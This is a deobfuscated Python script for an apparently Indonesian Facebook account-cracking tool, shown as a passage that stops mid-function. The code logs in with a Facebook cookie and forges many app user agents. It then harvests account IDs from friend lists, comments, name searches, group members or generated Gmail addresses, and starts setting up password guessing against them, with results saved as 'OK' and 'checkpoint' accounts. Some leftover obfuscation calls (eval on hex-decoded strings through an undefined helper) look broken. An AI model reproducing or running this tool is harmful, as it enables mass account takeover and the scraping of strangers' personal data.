# Deobfuscated by Ryougaa Hidekii
__removed__ = "License premium"
__date_dec__ = "- Friday, 1 December, 2023 -"

import os, sys, re, time, requests, calendar, random, bs4, uuid, json, subprocess
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import date, datetime
from requests.exceptions import ConnectionError

ses = requests.Session()
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import (
    Progress,
    SpinnerColumn,
    BarColumn,
    TextColumn,
    TimeElapsedColumn,
)

console = Console()
M2 = "[#FF0000]"  # MERAH
H2 = "[#00FF00]"  # HIJAU
K2 = "[#FFFF00]"  # KUNING
B2 = "[#00C8FF]"  # BIRU
P2 = "[#FFFFFF]"  # PUTIH
U2 = "[#AF00FF]"  # UNGU
O2 = "[#FF8F00]"  # ORANGE
AA = "[#AAAAAA]"  # Abu-Abu
sekarang = calendar.timegm(time.gmtime(time.time()))
tampung = []
ugent = []
ugen = []
hakix = []
try:
    file_color = open("data/theme_color", "r").read()
    color_text = file_color.split("|")[0]
    color_panel = file_color.split("|")[1]
except:
    color_text = "[#00FF00]"
    W1 = random.choice([M2, H2, K2])
    W2 = random.choice([K2, M2, K2])
    W3 = random.choice([H2, K2, M2])
    color_panel = "#AF00FF"
    color_ok = "#AF00FF"
    color_cp = "#00C8FF"
for z in range(200):
    versi_android = str(random.randint(4, 13)) + ".0.1"
    rr = random.randint
    rc = random.choice
    android = str(random.randint(4, 13))
    android_1 = str(random.randint(4, 11))
    chrome_1 = (
        str(random.randint(111, 555))
        + ".0.0."
        + str(random.randint(10, 30))
        + "."
        + str(random.randint(10, 150))
    )
    chrome_2 = str(random.randint(1, 99)) + ".0." + str(random.randint(10, 50))
    density = random.choice(
        [
            "{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1",
            "{density=3.0,width=1080,height=1920};FB_FW/1;]",
            "{density=3.0,width=1080,height=1920};FB_FW/1;]",
            "{density=2.0,width=1424,height=720};FB_FW/1;]",
            "{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]",
            "{density=2.0,width=720,height=1472};]",
            "{density=3.0,width=1080,height=2068};FB_FW/1;] FBBK/1",
            "{density=3.0,width=1080,height=2265};FB_FW/1;] FBBK/1",
            "{density=3.0,width=1080,height=1776};FB_FW/1;] FBBK/1",
            "{density=1.7,width=720,height=1358};FB_FW/1;FBRV/0;]",
            "{density=1.0,width=1066,height=552};]",
        ]
    )
    wiki = random.choice(["RKQ1", "QKQ1"])
    wiko = random.choice(["4A", "4BA"])
    wn = random.choice(["Win64", "WOW64"])
    siga1 = random.choice(
        [
            "GT-I9500",
            "SM-G900F",
            "SM-G920F",
            "SM-G930F",
            "SM-G950F",
            "SM-G960F",
            "SM-G973F",
            "SM-G981B",
            "SM-G991B",
            "SM-G990B",
        ]
    )
    siga2 = random.choice(
        ["X551", "X600", "X601", "X572", "X573", "X604", "X655", "X690", "X683", "X695"]
    )
    siga3 = random.choice(
        [
            "CPH1723",
            "CPH1613",
            "CPH1609",
            "CPH1717",
            "CPH1819",
            "CPH1917",
            "CPH1937",
            "CPH2127",
            "CPH2267",
            "CPH2409",
            "CPH1909",
        ]
    )
    siga4 = random.choice(
        [
            "V2023",
            "V2027",
            "V1981A",
            "V2244A",
            "V2029",
            "V2109",
            "V2153",
            "V2036",
            "V2158",
            "V2261",
            "V2207",
            "V1963A",
            "V3Max",
        ]
    )
    siga5 = random.choice(
        [
            "Redmi 1S",
            "Redmi Note 3G",
            "Redmi Note 3",
            "Mi 5",
            "Mi Mix 2",
            "Redmi Note 7",
            "Mi 9T",
            "Mi 10 Pro",
            "Mi 11 Ultra",
            "Mi 12",
        ]
    )
    whoami1 = f"Dalvik/2.1.0 (Linux; U; Android {android}.1.0; CPH1909 Build/O11019) [FBAN/Orca-Android;FBAV/{str(rr(200,399))}.0.0.{str(rr(15,30))}.{str(rr(100,150))};FBPN/com.facebook.orca;FBLC/th_TH;FBBV/{str(rr(182700000,182799999))};FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/{android}.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density}"
    whoami2 = f"Dalvik/2.1.0 (Linux; U; Android {android}.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/{str(rr(200,399))}.0.0.{str(rr(15,30))}.{str(rr(100,160))};FBPN/com.facebook.orca;FBLC/en_US;FBBV/{str(rr(172900000,172999999))};FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/{android}.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density}"
    whoami3 = f"Dalvik/2.1.0 (Linux; U; Android {android}.0.1; GT-I9505 Build/LRX22C) [FBAN/Orca-Android;FBAV/{str(rr(100,299))}.0.0.{str(rr(15,30))}.{str(rr(80,150))};FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/{str(rr(674600000,674699999))};FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/{android}.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density}"
    whoami4 = f"Dalvik/2.1.0 (Linux; U; Android {android}; Infinix X688B Build/QP1A.{str(rr(190000,199999))}.0{str(rr(15,30))}) [FBAN/MessengerLite;FBAV/{str(rr(200,399))}.0.0.{str(rr(5,30))}.{str(rr(100,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(346800000,346899999))};FBCR/TNT;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X688B;FBSV/{android};FBCA/arm64-v8a:null;FBDM/{density}"
    whoami5 = f"Dalvik/2.1.0 (Linux; U; Android {android}; Redmi Note 8T MIUI/V{str(rr(10,12))}.0.{str(rr(5,12))}.0.PCXEUXM) [FBAN/Orca-Android;FBAV/{str(rr(200,399))}.0.0.{str(rr(15,30))}.{str(rr(100,150))};FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/{str(rr(253300000,253399999))};FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/{android};FBCA/arm64-v8a:null;FBDM/{density}"
    whoami6 = f"Dalvik/2.1.0 (Linux; U; Android {android}.1.0; MI 5X MIUI/V{str(rr(9,12))}.{str(rr(5,12))}.{str(rr(1,5))}.0.ODBCNXM) [FBAN/Orca-Android;FBAV/{str(rr(200,399))}.0.0.{str(rr(15,30))}.{str(rr(100,150))};FBPN/com.facebook.orca;FBLC/en_US;FBBV/{str(rr(159500000,159599999))};FBCR/Ooredoo;FBMF/Xiaomi;FBBD/xiaomi;FBDV/MI 5X;FBSV/{android}.1.0;FBCA/arm64-v8a:null;FBDM/{density}"
    whoami7 = f"Dalvik/2.1.0 (Linux; U; Android {android}; EVR-N29 Build/HUAWEIEVR-N29) [FBAN/Orca-Android;FBAV/{str(rr(200,399))}.0.0.{str(rr(15,30))}.{str(rr(100,150))};FBPN/com.facebook.orca;FBLC/en_GB;FBBV/{str(rr(246800000,246899999))};FBCR/O2 - UK;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/EVR-N29;FBSV/{android};FBCA/arm64-v8a:null;FBDM/{density}"
    whoami8 = f"Mozilla/5.0 (Windows NT 10.0.{str(rr(10500,10599))}.{str(rr(700,799))}; osmeta {str(rr(4,12))}.{str(rr(1,9))}.{str(rr(47020000,47029999))}) AppleWebKit/602.1.1 (KHTML, like Gecko) Version/{str(rr(4,12))}.0 Safari/602.1.1 osmeta/{str(rr(4,12))}.{str(rr(1,9))}.{str(rr(47020000,47029999))}) Build/{str(rr(47020000,47029999))} [FBAN/FBW;FBAV/{str(rr(70,150))}.0.0.{str(rr(15,70))}.{str(rr(15,150))};FBBV/{str(rr(47020000,47029999))};FBRV/0;FBDV/WindowsDevice;FBMD/Aspire one 1-431;FBSN/Windows;FBSV/10.0.{str(rr(10500,10599))}.{str(rr(700,799))};FBSS/1;FBCR/;FBID/desktop;FBLC/en_GB;FBOP/45]"
    whoami9 = f"Dalvik/2.1.0 (Linux; U; Android {android}.1.1; F1 Build/LMY47V) [FBAN/FB4A;FBAV/{str(rr(40,100))}.0.0.{str(rr(15,30))}.{str(rr(100,150))};FBPN/com.facebook.katana;FBLC/en_GB;FBBV/{str(rr(142700000,142799999))};FBCR/Tele2 LT;FBMF/Oppo;FBBD/Oppo;FBDV/F1;FBSV/{android}.0;FBCA/armeabi-v7a:armeabi;FBDM/{density}"
    whoami10 = f"Dalvik/2.1.0 (Linux; U; Android {android}.0; SM-G900F Build/LRX21T) [FBAN/FB4A;FBAV/{str(rr(40,100))}.0.0.{str(rr(15,30))}.{str(rr(100,150))};FBPN/com.facebook.katana;FBLC/en_GB;FBBV/{str(rr(142700000,142799999))};FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-G900F;FBSV/{android}.0;FBCA/armeabi-v7a:armeabi;FBDM/{density}"
    whoami11 = f"Dalvik/2.1.0 (Android {android}; L-03K Build/PKQ1.{str(rr(190500,190599))}.00{str(rr(1,30))}) [FBAN/MessengerLite;FBAV/{str(rr(100,150))}.0.0.{str(rr(1,15))}.{str(rr(100,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(293500000,293599999))};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/{android};FBCA/armeabi-v7a:armeabi;FBDM/{density}"
    whoami12 = f"Dalvik/2.1.0 (Linux; U; Android {android}; Pixel 3 Build/QQ3A.{str(rr(200600,200699))}.00{str(rr(1,30))}) [FBAN/Orca-Android;FBAV/{str(rr(200,299))}.0.0.{str(rr(15,30))}.{str(rr(100,150))};FBPN/com.facebook.orca;FBLC/en_US;FBBV/{str(rr(227200000,227299999))};FBCR/Verizon;FBMF/Google;FBBD/google;FBDV/Pixel 3;FBSV/{android};FBCA/arm64-v8a:null;FBDM/{density}"
    whoami13 = f"Dalvik/2.1.0 (Linux; U; Android {android}.1.1; E6653 Build/{str(rr(30,100))}.{str(rr(1,30))}.A.{str(rr(1,15))}.{str(rr(50,150))}) [FBAN/Orca-Android;FBAV/{str(rr(100,150))}.0.0.{str(rr(15,30))}.{str(rr(90,150))};FBPN/com.facebook.orca;FBLC/en_ZA;FBBV/{str(rr(898900000,898999999))};FBCR/null;FBMF/Sony;FBBD/Sony;FBDV/E6653;FBSV/{android}.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density}"
    whoami14 = f"Mozilla/5.0 (Linux; Android {android}; Pixel 6a Build/SD2A.{str(rr(220100,220199))}.0{str(rr(15,100))}.A3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,150))}.0.{str(rr(4000,4999))}.{str(rr(70,150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(200,399))}.0.0.{str(rr(15,30))}.{str(rr(100,150))};]"
    whoami15 = f"Mozilla/5.0 (Linux; Android {android}; Pixel 6a Build/SD2A.{str(rr(220100,220199))}.0{str(rr(15,100))}.A3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,150))}.0.{str(rr(4000,4999))}.{str(rr(70,150))} Mobile Safari/537.36"
    ua = str(
        rc(
            [
                whoami1,
                whoami2,
                whoami3,
                whoami4,
                whoami5,
                whoami6,
                whoami7,
                whoami8,
                whoami9,
                whoami10,
                whoami11,
                whoami12,
                whoami13,
            ]
        )
    )
    if ua in ugent:
        pass
    else:
        ugent.append(ua)


def tahun(fx):
    if len(fx) == 15:
        if fx[:10] in ["1000000000"]:
            tahunz = "2009"
        elif fx[:9] in ["100000000"]:
            tahunz = "2009"
        elif fx[:8] in ["10000000"]:
            tahunz = "2009"
        elif fx[:7] in [
            "1000000",
            "1000001",
            "1000002",
            "1000003",
            "1000004",
            "1000005",
        ]:
            tahunz = "2009"
        elif fx[:7] in ["1000006", "1000007", "1000008", "1000009"]:
            tahunz = "2010"
        elif fx[:6] in ["100001"]:
            tahunz = "2010-2011"
        elif fx[:6] in ["100002", "100003"]:
            tahunz = "2011-2012"
        elif fx[:6] in ["100004"]:
            tahunz = "2012-2013"
        elif fx[:6] in ["100005", "100006"]:
            tahunz = "2013-2014"
        elif fx[:6] in ["100007", "100008"]:
            tahunz = "2014-2015"
        elif fx[:6] in ["100009"]:
            tahunz = "2015"
        elif fx[:5] in ["10001"]:
            tahunz = "2015-2016"
        elif fx[:5] in ["10002"]:
            tahunz = "2016-2017"
        elif fx[:5] in ["10003"]:
            tahunz = "2018"
        elif fx[:5] in ["10004"]:
            tahunz = "2019"
        elif fx[:5] in ["10005"]:
            tahunz = "2020"
        elif fx[:5] in ["10006", "10007", "10008"]:
            tahunz = "2021-2022"
        else:
            tahunz = ""
    elif len(fx) in [9, 10]:
        tahunz = "2008-2009"
    elif len(fx) == 8:
        tahunz = "2007-2008"
    elif len(fx) == 7:
        tahunz = "2006-2007"
    else:
        tahunz = ""
    return tahunz


dic = {
    "1": "January",
    "2": "February",
    "3": "March",
    "4": "April",
    "5": "May",
    "6": "June",
    "7": "July",
    "8": "August",
    "9": "September",
    "10": "October",
    "11": "November",
    "12": "December",
}
dic2 = {
    "01": "January",
    "02": "February",
    "03": "March",
    "04": "April",
    "05": "May",
    "06": "June",
    "07": "July",
    "08": "August",
    "09": "September",
    "10": "October",
    "11": "November",
    "12": "Devember",
}
tgl = datetime.now().day
bln = dic[(str(datetime.now().month))]
thn = datetime.now().year
okc = "OK-" + str(tgl) + "-" + str(bln) + "-" + str(thn) + ".txt"
cpc = "CP-" + str(tgl) + "-" + str(bln) + "-" + str(thn) + ".txt"


def CetakBanner(ulfahsadiyah, asu):
    Console(width=100).print(Panel(ulfahsadiyah, style="purple"), justify="center")


def whoami(kaya, kontol):
    Console(width=100).print(Panel(kaya, style="purple"), justify="center")


class Logo:
    def bersihkan_layar(self):
        if "linux" in sys.platform.lower():
            try:
                os.system("clear")
            except:
                pass
        elif "win" in sys.platform.lower():
            try:
                os.system("cls")
            except:
                pass
        else:
            try:
                os.system("clear")
            except:
                pass

    def logonya(self):
        self.bersihkan_layar()
        prints(
            Panel(
                f"""{U2}╭─────────╮\n│ {M2}⬤  {K2}⬤  {H2}⬤ {U2}│ \n{U2}╰─────────╯{B2}
          _____
       __|___  |__  ____    ______  ______       __   __  ____    __  __  ___
      |   ___|    ||    \  |   ___||   ___| ___ |  |_|  ||    \  |  |/ / |   |
      |   ___|    ||     \ |   |__ |   ___||___||   _   ||     \ |     \ |   |
      |___|     __||__|\__\|______||______|     |__| |__||__|\__\|__|\__\|___|
         |_____|
""",
                width=87,
                style=f"{color_panel}",
            )
        )

class Login:
    def __init__(self):
        self.ip = ses.get("http://ip-api.com/json/").json()["query"]
        self.negara = ses.get("http://ip-api.com/json/").json()["country"]

    def menu_login(self):
        Logo().logonya()
        prints(
            Panel(
                f"{H2}\t                            Menu Login",
                width=87,
                style=f"{color_panel}",
            )
        )
        prints(
            Panel(
                f"""{P2}[{color_text}01{P2}]. login menggunakan cookie facebook ( {H2}Recomended{P2} )\n[{color_text}02{P2}]. login menggunakan No dan Password ( {M2}No Recomended{P2} )""",
                width=87,
                style=f"{color_panel}",
            )
        )
        login = console.input(f" {U2}# {P2}pilih menu : ")
        if login in ["1", "01"]:
            prints(
                Panel(
                    f"""{P2}silahkan masukan cookiemu disini dan pastikan autentikasi tidak aktif""",
                    width=87,
                    style=f"{color_panel}",
                )
            )
            cookie = console.input(f" {U2}# {P2}masukan cookie : ")
            self.login_cookie(cookie)
        else:
            exit(
                prints(
                    Panel(
                        f"""{M2}🙏 mohon maaf fitur ini sedang dalam tahap perbaikan""",
                        width=87,
                        style=f"{color_panel}",
                    )
                )
            )

    def login_cookie(self, cookie):
        try:
            url = ses.get(
                "https://mbasic.facebook.com/", cookies={"cookie": cookie}
            ).text
            if "Apa yang Anda pikirkan sekarang" in url:
                pass
            else:
                for z in url.find_all("a", href=True):
                    if "Tidak, Terima Kasih" in z.text:
                        get = ses.get(
                            "https://mbasic.facebook.com" + z["href"], cookies=cookie
                        )
                        parsing = parser(get.text, "html.parser")
                        action = parsing.find("form", {"method": "post"})["action"]
                        data = {
                            "fb_dtsg": re.search(
                                'name="fb_dtsg" value="(.*?)"', str(get.text)
                            ).group(1),
                            "jazoest": re.search(
                                'name="jazoest" value="(.*?)"', str(get.text)
                            ).group(1),
                            "submit": "OK, Gunakan Data",
                        }
                        post = ses.post(
                            "https://mbasic.facebook.com" + action,
                            data=data,
                            cookies=cookie,
                        )
                        break
            open("data/cookie", "w").write(cookie)
            Menu().menu()
        except:
            prints(
                Panel(
                    f"""{M2}cookie invalid, silahkan gunakan cookie lain yang masih baru atau fresh""",
                    width=87,
                    style=f"{color_panel}",
                )
            )
            sys.exit()

    def ubah_bahasa(self, cookie):
        try:
            url = ses.get(
                "https://mbasic.facebook.com/language/", cookies={"cookie": cookie}
            )
            parsing = parser(url.text, "html.parser")
            for x in parsing.find_all("form", {"method": "post"}):
                if "Bahasa Indonesia" in str(x):
                    data = {
                        "fb_dtsg": re.search(
                            'name="fb_dtsg" value="(.*?)"', str(url.text)
                        ).group(1),
                        "jazoest": re.search(
                            'name="jazoest" value="(.*?)"', str(url.text)
                        ).group(1),
                        "submit": "Bahasa Indonesia",
                    }
                    post = ses.post(
                        "https://mbasic.facebook.com" + x["action"],
                        data=data,
                        cookies={"cookie": cookie},
                    )
        except:
            pass


class Menu:
    def __init__(self):
        self.men = []
        self.id = []
        self.ip = ses.get("http://ip-api.com/json/").json()["query"]
        self.negara = ses.get("http://ip-api.com/json/").json()["country"]

    def cek_login(self, cookie):
        try:
            url = ses.get(
                "https://mbasic.facebook.com/profile.php", cookies=cookie
            ).text
            nama = re.findall("<title>(.*?)</title>", url)[0]
            if "Konten Tidak Ditemukan" in nama:
                try:
                    os.remove("data/cookie")
                except:
                    pass
                Login().menu_login()
            else:
                return nama
        except ConnectionError:
            prints(
                Panel(
                    f"""{M2}koneksi internet kamu bermasalah, silahkan cek koneksi kamu kembali""",
                    width=87,
                    style=f"{color_panel}",
                )
            )
            exit()

    def menu(self):
        Logo().logonya()
        try:
            cok = open("data/cookie", "r").read()
            cookie = {"cookie": cok}
            nama = self.cek_login(cookie)
        except:
            try:
                os.remove("data/cookie")
            except:
                pass
            Login().menu_login()
        pornhub = []
        yonkou = []
        self.jol = Console()
        self.tol = Console()
        prints(
            Panel(
                f"{U2}        {self.negara}",
                width=87,
                padding=(0, 30),
                title=f"{B2}• {U2}• {AA}• {B2}Negara {B2}• {U2}• {AA}•",
                subtitle=f"{B2}• {U2}• {AA}• {B2}Version : {H2}0.0.1 {B2}• {U2}• {AA}•",
                style=eval(
                    XWWWXXXWWXXXXXWWWX(b"66227b636f6c6f725f70616e656c7d22").decode(
                        "8ftu"[::+-+-(-(+1))]
                    )
                ),
            )
        )
        yonkou.append(
            Panel(
                f" {B2}Nama Akun       {U2}: {AA}{nama}\n {B2}Status Pengguna {U2}: {H2}Premium\n {B2}Ip Address      {U2}: {AA}{self.ip}\n {B2}Tanggal         {U2}: {AA}{tgl}",
                width=43,
                padding=(0, 2),
                title=f"{B2}• {U2}• {AA}• {B2}Info-User {B2}• {U2}• {AA}•",
                style=eval(
                    XWWWXXXWWXXXXXWWWX(b"66227b636f6c6f725f70616e656c7d22").decode(
                        "8ftu"[::+-+-(-(+1))]
                    )
                ),
            )
        )
        yonkou.append(
            Panel(
                f" {B2}Author   {U2}: {AA}Wild of D\n {B2}Github  {U2} : {AA}Luffy-XD\n{B2} Facebook {U2}: {AA}dika.tw.58\n{B2} Whatsapp {U2}: {AA}+62*************",
                width=43,
                padding=(0, 2),
                title=f"{B2}• {U2}• {AA}• {B2}Info-Author {B2}• {U2}• {AA}•",
                style=eval(
                    XWWWXXXWWXXXXXWWWX(b"66227b636f6c6f725f70616e656c7d22").decode(
                        "8ftu"[::+-+-(-(+1))]
                    )
                ),
            )
        )
        self.jol.print(Columns(yonkou))
        prints(
            Panel(
                f"{B2}\t                           Daftar Menu",
                width=87,
                style=f"{color_panel}",
            )
        )
        pornhub.append(
            Panel(
                f"{P2}[{U2}01{P2}]. {B2}crack {AA}dari {U2}id publik\n{P2}[{U2}02{P2}]. {B2}crack {AA}dari {U2}pengikut\n{P2}[{U2}03{P2}]. {B2}crack {AA}dari {U2}komentar\n{P2}[{U2}04{P2}]. {B2}crack {AA}dari {U2}random email",
                width=43,
                padding=(0, 2),
                style=f"{color_panel}",
            )
        )
        pornhub.append(
            Panel(
                f"{P2}[{U2}05{P2}]. {B2}crack {AA}dari {U2}pencarian nama\n{P2}[{U2}06{P2}]. {B2}crack {AA}dari {U2}member grup\n{P2}[{U2}07{P2}]. {B2}crack {AA}dari {U2}file sendiri\n{P2}[{U2}08{P2}]. {U2}cek {AA}opsi {U2}checkpoint",
                width=43,
                padding=(0, 2),
                style=f"{color_panel}",
            )
        )
        self.tol.print(Columns(pornhub))
        prints(
            Panel(
                f"""{P2}   ketik {M2}logout{P2} untuk hapus cookie dan ketik {B2}lain{P2} untuk ke menu lain""",
                width=87,
                padding=(0, 6),
                style=f"{color_panel}",
            )
        )
        menu = console.input(f" {U2}# {P2}pilih menu : ")
        if menu in ["logout"]:
            os.system("rm data/cookie")
            exit(
                prints(
                    Panel(
                        f"""{H2}berhasil menghapus cookie, silahkan ketik ulang python haki-fb.py""",
                        width=87,
                        style=f"{color_panel}",
                    )
                )
            )
        elif menu in ["1", "01"]:
            prints(
                Panel(
                    f"""{P2}     masukan id target, pastikan id target bersifat publik dan tidak private""",
                    subtitle=f"{P2}ketik {B2}me{P2} untuk dump dari teman sendiri",
                    width=87,
                    style=eval(
                        XWWWXXXWWXXXXXWWWX(b"66227b636f6c6f725f70616e656c7d22").decode(
                            "8ftu"[::+-+-(-(+1))]
                        )
                    ),
                )
            )
            user = console.input(f" {U2}# {P2}masukan id atau username : ")
            if user in ["Me", "me"]:
                user = Dump(cookie).GetUser()
            Dump(cookie).Dump_Publik(f"https://mbasic.facebook.com/{user}?v=friends")
            Crack().atursandi()
        elif menu in ["3", "03"]:
            prints(
                Panel(
                    f"""{P2}masukan id postingan, pastikan postingan bersifat publik dan tidak private""",
                    width=87,
                    style=f"{color_panel}",
                )
            )
            user = console.input(f" {U}# {P2}masukan id postingan : ")
            Dump(cookie).Dump_Komentar(f"https://mbasic.facebook.com/{user}")
            Crack().atursandi()
        elif menu in ["4", "04"]:
            prints(
                Panel(
                    f"""{P2}masukan nama untuk email, format email akan selalu @gmail.com""",
                    width=87,
                    style=f"{color_panel}",
                )
            )
            user = console.input(f" {U2}# {P2}masukan nama : ")
            limit = console.input(f" {U2}# {P2}masukan limit : ")
            Dump(cookie).Dump_Email(user, limit)
            Crack().atursandi()
        elif menu in ["5", "05"]:
            prints(
                Panel(
                    f"""{P2}kamu bisa menggunakan koma (,) sebagai pemisah jika lebih dari 1 nama""",
                    width=87,
                    style=f"{color_panel}",
                )
            )
            user = console.input(f" {U2}# {P2}masukan nama : ")
            common = open("Haki/nama_indonesia", "r").read().splitlines()
            for idt in user.split(","):
                self.id.append(idt)
                for people in common:
                    self.id.append(people + " " + idt)
            try:
                for gas in self.id:
                    Dump(cookie).Dump_Pencarian(
                        f"https://mbasic.facebook.com/public/{gas}"
                    )
            except:
                pass
            Crack().atursandi()
        elif menu in ["6", "06"]:
            prints(
                Panel(
                    f"""{P2}masukan id grup, pastikan grup bersifat publik dan tidak private""",
                    width=87,
                    style=f"{color_panel}",
                )
            )
            user = console.input(f" {U}# {P2}masukan id grup : ")
            Dump(cookie).Dump_MemberGrup(f"https://mbasic.facebook.com/groups/{user}")
            Crack().atursandi()
        elif menu in ["7", "07"]:
            prints(
                Panel(
                    f"""{P2}masukan tempat file, pastikan izin ke penyimpanan sudah diaktifkan""",
                    width=87,
                    style=f"{color_panel}",
                )
            )
            user = console.input(f" {U2}# {P2}masukan tempat file : ")
            Dump(cookie).Dump_File(user)
            Crack().atursandi()
        elif menu in ["BOT", "Bot", "bot"]:
            exit(
                prints(
                    Panel(
                        f"""{M2}🙏 mohon maaf fitur ini sedang dalam tahap perbaikan""",
                        width=87,
                        style=f"{color_panel}",
                    )
                )
            )
        elif menu in ["8", "08"]:
            file_cp()
        elif menu in ["LAIN", "Lain", "lain"]:
            Lain(cookie).menu()
        else:
            exit(
                prints(
                    Panel(
                        f"""{M2}🙏 mohon maaf fitur ini sedang dalam tahap perbaikan""",
                        width=87,
                        style=f"{color_panel}",
                    )
                )
            )


class Dump:
    def __init__(self, cookie):
        self.cookie = cookie

    def GetUser(self):
        try:
            url = ses.get(
                "https://mbasic.facebook.com/profile.php", cookies=self.cookie
            ).text
            uid = re.findall('name="target" value="(.*?)"', url)[0]
            return uid
        except:
            pass

    def Dump_Publik(self, url):
        try:
            url = parser(ses.get(url, cookies=self.cookie).text, "html.parser")
            for z in url.find_all("a", href=True):
                if "fref" in z.get("href"):
                    if "/profile.php?id=" in z.get("href"):
                        uid = "".join(
                            bs4.re.findall("profile\\.php\\?id=(.*?)&", z.get("href"))
                        )
                        nama = z.text
                    else:
                        uid = "".join(bs4.re.findall("/(.*?)\\?", z.get("href")))
                        nama = z.text
                    if uid + "<=>" + nama in tampung:
                        pass
                    else:
                        tampung.append(uid + "<=>" + nama)
                    console.print(
                        f" {U2}# {P2}sedang proses mengumpulkan {U2}id{P2}, berhasil mendapatkan{B2} {len(tampung)} {P2}id....",
                        end="\r",
                    )
            for x in url.find_all("a", href=True):
                if "Lihat Teman Lain" in x.text:
                    self.Dump_Publik("https://mbasic.facebook.com/" + x.get("href"))
        except:
            pass

    def Dump_Komentar(self, url):
        try:
            data = parser(ses.get(url).text, "html.parser")
            for isi in data.find_all("h3"):
                for ids in isi.find_all("a", href=True):
                    if "profile.php" in ids.get("href"):
                        uid = ids.get("href").split("=")[1].replace("&refid", "")
                    else:
                        uid = re.findall("/(.*?)?__", ids["href"])[0].replace(
                            "?refid=52&", ""
                        )
                    nama = ids.text
                    if uid + "<=>" + nama in tampung:
                        pass
                    else:
                        tampung.append(uid + "<=>" + nama)
                    console.print(
                        f" {U2}# {P2}sedang proses mengumpulkan {U2}id{P2}, berhasil mendapatkan{B2} {len(tampung)} {P2}id....",
                        end="\r",
                    )
            for z in data.find_all("a", href=True):
                if "Lihat komentar sebelumnya…" in z.text:
                    self.Dump_Komentar("https://mbasic.facebook.com" + z["href"])
        except:
            pass

    def Dump_Pencarian(self, url):
        try:
            data = parser(ses.get(str(url)).text, "html.parser")
            for z in data.find_all("td"):
                namp = re.findall(
                    '\\<a\\ href\\="\\/(.*?)">\\<div\\ class\\=".*?">\\<div\\ class\\=".*?">(.*?)<\\/div\\>',
                    str(z),
                )
                for uid, nama in namp:
                    if "profile.php?" in uid:
                        uid = re.findall("id=(.*)", str(uid))[0]
                    elif "<span" in nama:
                        nama = re.findall("(.*?)\\<", str(nama))[0]
                    if uid + "<=>" + nama in tampung:
                        pass
                    else:
                        tampung.append(uid + "<=>" + nama)
                    console.print(
                        f" {U2}# {P2}sedang proses mengumpulkan {U2}id{P2}, berhasil mendapatkan{B2} {len(tampung)} {P2}id....",
                        end="\r",
                    )
            for x in data.find_all("a", href=True):
                if "Lihat Hasil Selanjutnya" in x.text:
                    self.Dump_Pencarian(x.get("href"))
        except:
            pass

    def Dump_MemberGrup(self, url):
        try:
            data = parser(
                ses.get(
                    url,
                    cookies=self.cookie,
                    headers={
                        "user-agent": "Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba"
                    },
                ).text,
                "html.parser",
            )
            judul = re.findall("<title>(.*?)</title>", str(data))[0]
            for isi in data.find_all("h3"):
                for ids in isi.find_all("a", href=True):
                    if "profile.php" in ids.get("href"):
                        uid = ids.get("href").split("=")[1].replace("&eav", "")
                        nama = ids.text
                    else:
                        if ids.text == judul:
                            pass
                        else:
                            uid = ids.get("href").split("/")[1].split("?")[0]
                            nama = ids.text
                    if uid + "<=>" + nama in tampung:
                        pass
                    else:
                        tampung.append(uid + "<=>" + nama)
                    console.print(
                        f" {U2}# {P2}sedang proses mengumpulkan {U2}id{P2}, berhasil mendapatkan{B2} {len(tampung)} {P2}id....",
                        end="\r",
                    )
            for x in data.find_all("a", href=True):
                if "Lihat Postingan Lainnya" in x.text:
                    self.Dump_MemberGrup("https://mbasic.facebook.com" + x.get("href"))
        except:
            pass

    def Dump_File(self, lok):
        try:
            file = open(lok, "r").read().splitlines()
            for z in file:
                tampung.append(z)
        except:
            pass

    def Dump_Email(self, nama, limit):
        try:
            for z in range(int(limit)):
                email = nama + str(z) + "@gmail.com<=>" + nama
                if email in tampung:
                    pass
                else:
                    tampung.append(email)
        except:
            pass


class Crack:
    def __init__(self):
        self.loop = 0
        self.ok = []
        self.cp = []
        self.hari_ini = datetime.now().strftime("%d-%B-%Y")

    def atursandi(self):
        prints(
            Panel(
                f"""{P2}    berhasil mengumpulkan{B2} {len(tampung)} {P2}id""",
                width=87,
                padding=(0, 21),
                style=f"{color_panel}",
            )
        )
        set = console.input(
            f" {U2}# {P2}apakah kamu ingin menggunakan sandi manual?(y/n) : "
        )
        if set in ["Y", "y"]:
            prints(
                Panel(
                    f"""{P2}silahkan buat katasandi dengan , (koma) sebagai pemisah tiap katasandi""",
                    width=87,
                    style=f"{color_panel}",
                )
            )
            pwx = console.input(f" {U2}# {P2}buat katasandi : ").split(",")
            if len(pwx) <= 5:
                prints(
                    Panel(
                        f"""{M2}katasandi harus minimal 6 huruf""",
                        width=87,
                        style=f"{color_panel}",
                    )
